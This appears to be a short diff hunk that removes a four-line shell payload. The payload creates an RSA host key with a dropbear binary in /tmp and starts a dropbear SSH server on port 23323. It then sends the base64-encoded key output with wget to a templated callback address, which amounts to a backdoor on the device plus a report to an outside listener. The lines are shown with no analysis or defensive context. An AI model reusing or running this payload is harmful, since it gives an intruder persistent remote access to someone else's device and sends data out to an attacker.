@@ -1,4 +1,0 @@
-mkdir -p /etc/config/dropbear
-a=$(/tmp/dropbearkey -t rsa -f /etc/config/dropbear/dropbear_rsa_host_key 2>&1 | base64 -w 0)
-/tmp/dropbear -r /etc/config/dropbear/dropbear_rsa_host_key -p 23323
-wget "http://{{LOCAL_IP}}:{{PORT}}/$a"
